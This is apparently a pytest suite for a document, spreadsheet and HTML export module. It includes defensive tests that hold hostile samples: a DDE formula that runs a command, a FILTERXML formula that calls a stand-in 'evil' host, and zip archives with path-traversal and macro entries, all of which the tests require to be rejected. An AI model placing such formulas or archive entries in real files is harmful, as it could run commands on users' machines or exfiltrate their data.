from __future__ import annotations

import io
import zipfile
from datetime import date
from xml.etree import ElementTree

import pytest
from openpyxl import load_workbook

from app.artifacts import (
    CodeBlock,
    DocumentSpec,
    HeadingBlock,
    HtmlArtifactSpec,
    ListBlock,
    ParagraphBlock,
    TableBlock,
    WorkbookCell,
    WorkbookChart,
    WorkbookSheet,
    WorkbookSpec,
    export_artifact,
    export_docx,
    export_xlsx,
    preview_artifact,
    recalculate_xlsx,
    render_document_html,
    render_markdown,
)
from app.artifacts.errors import UnsupportedFeatureError
from app.artifacts.safety import inspect_office_archive


def test_markdown_keeps_structure_and_html_escapes_markup():
    spec = DocumentSpec(title="Course notes", blocks=[
        HeadingBlock(id="h", level=2, text="Heading 2"),
        ParagraphBlock(id="p", text="A line with $5.00 and a\nreal newline."),
        ListBlock(id="l", ordered=False, items=["one", "two"]),
        TableBlock(id="t", headers=["A", "B"], rows=[["a|b", "line1\nline2"]]),
        CodeBlock(id="c", language="py", text="x = 1"),
    ])
    rendered = render_markdown(spec)
    for expected in ("## Heading 2", "A line with $5.00 and a\nreal newline.", "- one",
                     r"a\|b", chr(96) * 3 + "py\nx = 1"):
        assert expected in rendered
    safe = render_document_html(
        DocumentSpec(title="t", blocks=[ParagraphBlock(id="p", text="<script>alert(1)</script>")])
    )
    assert "<script>" not in safe
    assert "&lt;script&gt;" in safe


def test_docx_export_keeps_supported_content_and_page_layout():
    from docx import Document as WordDocument

    spec = DocumentSpec(
        title="Lab notes",
        blocks=[
            HeadingBlock(id="heading-a", level=2, text="Week 2"),
            ParagraphBlock(id="para-a", text="A line\nand a second **bold** line."),
            ListBlock(id="list-a", ordered=True, items=["first", "second"]),
            TableBlock(id="table-a", headers=["Item", "Amount"], rows=[["books", "$12.50"]]),
            CodeBlock(id="code-a", language="py", text="x = 1"),
        ],
    )
    spec.page_layout.width_inches = 8.27
    spec.page_layout.height_inches = 11.69
    spec.page_layout.margin_left_inches = 0.7
    document = WordDocument(io.BytesIO(export_docx(spec)))
    assert document.sections[0].page_width.inches == pytest.approx(8.27, abs=0.01)
    assert document.sections[0].left_margin.inches == pytest.approx(0.7, abs=0.01)
    text = [paragraph.text for paragraph in document.paragraphs]
    assert "Lab notes" in text and "Week 2" in text and "first" in text and "x = 1" in text
    assert any("bold" in paragraph.text and "**" not in paragraph.text
               for paragraph in document.paragraphs)
    assert [[cell.text for cell in row.cells] for row in document.tables[0].rows] == [
        ["Item", "Amount"], ["books", "$12.50"]]


def test_xlsx_export_keeps_sheets_formulas_styles_and_layout():
    spec = WorkbookSpec(
        title="Lab data",
        sheets=[
            WorkbookSheet(
                id="s1",
                name="Measurements",
                cells=[
                    WorkbookCell(id="a1", row=1, column=1, value="Trial", style={"bold": True}),
                    WorkbookCell(id="b2", row=2, column=2, value=3.5,
                                 style={"number_format": "$0.00"}),
                    WorkbookCell(id="b3", row=3, column=2, formula="=SUM(B2:B2)"),
                    WorkbookCell(id="date", row=4, column=1, value=date(2026, 10, 7),
                                 style={"number_format": "yyyy-mm-dd"}),
                ],
                column_widths={"A": 24},
                freeze_panes="A2",
            ),
            WorkbookSheet(id="s2", name="Notes",
                          cells=[WorkbookCell(id="note", row=1, column=1, value="See notebook")]),
        ],
    )
    workbook = load_workbook(io.BytesIO(export_xlsx(spec)), data_only=False)
    sheet = workbook["Measurements"]
    assert workbook.sheetnames == ["Measurements", "Notes"]
    assert sheet["B3"].value == "=SUM(B2:B2)"
    assert sheet["B2"].number_format == "$0.00"
    assert sheet["A1"].font.bold is True
    assert sheet["A4"].value.date() == date(2026, 10, 7)
    assert sheet.column_dimensions["A"].width == 24
    assert sheet.freeze_panes == "A2"
    workbook.close()


@pytest.mark.parametrize("formula", [
    "=cmd|'/c calc'!A1", '=FILTERXML("http://evil/?d=static","//a")'])
def test_xlsx_export_refuses_execution_capable_formulas(formula):
    spec = WorkbookSpec(title="Bad", sheets=[WorkbookSheet(
        id="s", name="Sheet", cells=[WorkbookCell(id="a", row=1, column=1, formula=formula)])])
    with pytest.raises(UnsupportedFeatureError) as exported:
        export_xlsx(spec)
    assert "external or execution-capable formulas" in exported.value.features


def test_xlsx_export_wraps_multiline_text_and_keeps_row_heights():
    spec = WorkbookSpec(
        title="Wrapped notes",
        sheets=[
            WorkbookSheet(
                id="s",
                name="Notes",
                cells=[
                    WorkbookCell(id="auto", row=1, column=1, value="first\nsecond\nthird"),
                    WorkbookCell(
                        id="explicit-true", row=2, column=1, value="wrapped\ntext",
                        style={"wrap_text": True},
                    ),
                    WorkbookCell(
                        id="explicit-false", row=3, column=1, value="unwrapped\ntext",
                        style={"wrap_text": False},
                    ),
                    WorkbookCell(id="custom-height", row=4, column=1, value="one line"),
                    WorkbookCell(id="minimum-height", row=5, column=1, value="a\nb\nc"),
                ],
                row_heights={2: 42.0, 4: 28.5, 5: 20.0},
            )
        ],
    )
    workbook = load_workbook(io.BytesIO(export_xlsx(spec)), data_only=False)
    worksheet = workbook["Notes"]
    assert worksheet["A1"].alignment.wrap_text is True
    assert worksheet.row_dimensions[1].height == 45
    assert worksheet["A2"].alignment.wrap_text is True
    assert worksheet.row_dimensions[2].height == 42
    assert worksheet["A3"].alignment.wrap_text is None
    assert worksheet.row_dimensions[4].height == 28.5
    assert worksheet.row_dimensions[5].height == 45
    workbook.close()


def test_workbook_row_height_bounds_and_wrap_text_type_are_validated():
    with pytest.raises(ValueError):
        WorkbookSheet(
            id="s", name="Notes", cells=[], row_heights={0: 20},
        )
    with pytest.raises(ValueError):
        WorkbookSheet(
            id="s", name="Notes", cells=[], row_heights={1: 410},
        )
    with pytest.raises(ValueError):
        WorkbookCell(
            id="bad-wrap", row=1, column=1, value="x", style={"wrap_text": "yes"},
        )
    with pytest.raises(ValueError, match="maximum row height"):
        export_xlsx(
            WorkbookSpec(
                title="Too many lines",
                sheets=[WorkbookSheet(
                    id="s", name="Notes", cells=[WorkbookCell(
                        id="too-tall", row=1, column=1, value="\n".join("line" for _ in range(28)),
                    )],
                )],
            )
        )


def test_workbook_export_writes_charts():
    spec = WorkbookSpec(
        title="Chart sample",
        sheets=[
            WorkbookSheet(
                id="s",
                name="Data",
                cells=[
                    WorkbookCell(id="h1", row=1, column=1, value="Course"),
                    WorkbookCell(id="h2", row=1, column=2, value="Count"),
                    WorkbookCell(id="c1", row=2, column=1, value="Math"),
                    WorkbookCell(id="v1", row=2, column=2, value=5),
                    WorkbookCell(id="c2", row=3, column=1, value="Physics"),
                    WorkbookCell(id="v2", row=3, column=2, value=3),
                ],
            )
        ],
        charts=[
            WorkbookChart(
                id="chart-1",
                type="bar",
                title="Counts",
                sheet_id="s",
                data_range="B1:B3",
                categories_range="A2:A3",
            )
        ],
    )
    data = export_xlsx(spec)
    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        assert any(name.startswith("xl/charts/chart") for name in archive.namelist())


def test_formula_preview_and_export_never_claim_calculated_values_without_isolated_runner():
    spec = WorkbookSpec(
        title="Calc",
        sheets=[
            WorkbookSheet(
                id="s",
                name="Sheet1",
                cells=[
                    WorkbookCell(id="x", row=1, column=1, value=1),
                    WorkbookCell(id="total", row=2, column=1, formula="=SUM(A1:A1)"),
                ],
            )
        ],
    )
    preview = preview_artifact(spec)
    assert preview["status"] == "needs_recalculation"
    formula = next(cell for cell in preview["sheets"][0]["cells"] if cell["formula"])
    assert formula["calculatedValue"] is None
    exported = export_artifact(spec, ".xlsx")
    assert exported.recalculation_status == "needs_recalculation"
    assert "not configured" in exported.message
    assert recalculate_xlsx(exported.content, spec).status == "needs_recalculation"


def test_office_archive_rejects_path_traversal_and_macro_parts():
    bad_path = io.BytesIO()
    with zipfile.ZipFile(bad_path, "w") as archive:
        archive.writestr("../evil.xml", "<x/>")
    with pytest.raises(ValueError, match="unsafe path"):
        inspect_office_archive(bad_path.getvalue(), kind="docx")
    macro = io.BytesIO()
    with zipfile.ZipFile(macro, "w") as archive:
        archive.writestr("xl/vbaProject.bin", b"MZ")
        archive.writestr("xl/workbook.xml", "<x/>")
    with pytest.raises(UnsupportedFeatureError) as exc:
        inspect_office_archive(macro.getvalue(), kind="xlsx")
    assert "macro-enabled content" in exc.value.features


def test_html_artifact_is_explicitly_marked_for_sandbox_preview():
    spec = HtmlArtifactSpec(
        title="Interactive lesson",
        html="<!doctype html><script>document.body.textContent='ok'</script>",
    )
    preview = preview_artifact(spec)
    assert preview["sandboxRequired"] is True
    exported = export_artifact(spec, "html")
    from html.parser import HTMLParser
    class Frames(HTMLParser):
        def handle_starttag(self, tag, attrs):
            if tag == "iframe":
                self.frame = dict(attrs)
    parser = Frames()
    parser.feed(exported.content.decode("utf-8"))
    assert parser.frame["sandbox"] == ""
    assert "document.body.textContent" not in parser.frame["srcdoc"]
    assert "script-src 'none'" in parser.frame["srcdoc"]
    assert "connect-src 'none'" in parser.frame["srcdoc"]
    assert "frame-src 'self'" in exported.content.decode("utf-8")
    assert exported.filename == "interactive-lesson.html"


@pytest.mark.parametrize(
    ("returned_formula", "changed_input"),
    [("SUM(A1:A1)", False), ("SUM(A1:A1)+1", False), ("SUM(A1:A1)", True)],
)
def test_recalculation_preserves_formulas_and_inputs_before_accepting_cached_values(
    returned_formula, changed_input,
):
    spec = WorkbookSpec(
        title="Calc",
        sheets=[
            WorkbookSheet(
                id="s",
                name="Sheet1",
                cells=[
                    WorkbookCell(id="x", row=1, column=1, value=1),
                    WorkbookCell(id="total", row=2, column=1, formula="=SUM(A1:A1)"),
                ],
            )
        ],
    )
    raw = export_xlsx(spec)
    with zipfile.ZipFile(io.BytesIO(raw)) as source:
        parts = {name: source.read(name) for name in source.namelist()}
    sheet_xml = parts["xl/worksheets/sheet1.xml"].decode("utf-8")
    assert "<f>SUM(A1:A1)</f><v></v>" in sheet_xml
    recalculated_xml = sheet_xml.replace(
        "<f>SUM(A1:A1)</f><v></v>", f"<f>{returned_formula}</f><v>1</v>"
    )
    if changed_input:
        root = ElementTree.fromstring(recalculated_xml)
        namespace = "{http://schemas.openxmlformats.org/spreadsheetml/2006/main}"
        input_cell = root.find(f".//{namespace}c[@r='A1']/{namespace}v")
        assert input_cell is not None and input_cell.text == "1"
        input_cell.text = "9"
        recalculated_xml = ElementTree.tostring(root, encoding="unicode")
    parts["xl/worksheets/sheet1.xml"] = recalculated_xml.encode("utf-8")
    cached = io.BytesIO()
    with zipfile.ZipFile(cached, "w", zipfile.ZIP_DEFLATED) as target:
        for name, content in parts.items():
            target.writestr(name, content)

    class IsolatedRunner:
        def recalculate_xlsx(self, xlsx_bytes: bytes, *, timeout_seconds: int) -> bytes:
            assert xlsx_bytes == raw
            assert timeout_seconds == 60
            return cached.getvalue()

    result = recalculate_xlsx(raw, spec, runner=IsolatedRunner())
    if returned_formula == "SUM(A1:A1)" and not changed_input:
        assert result.status == "verified"
        assert result.xlsx_bytes == cached.getvalue()
    else:
        assert result.status == "needs_recalculation"
        assert result.xlsx_bytes == raw
        changed_address = "Sheet1!A1" if changed_input else "Sheet1!A2"
        assert "changed formulas or inputs at: " + changed_address in result.message

    class FailingRunner:
        def recalculate_xlsx(self, xlsx_bytes: bytes, *, timeout_seconds: int) -> bytes:
            raise RuntimeError("sandbox unavailable")

    failed = recalculate_xlsx(raw, spec, runner=FailingRunner())
    assert failed.status == "needs_recalculation"
    assert failed.xlsx_bytes == raw
    assert "sandbox unavailable" in failed.message
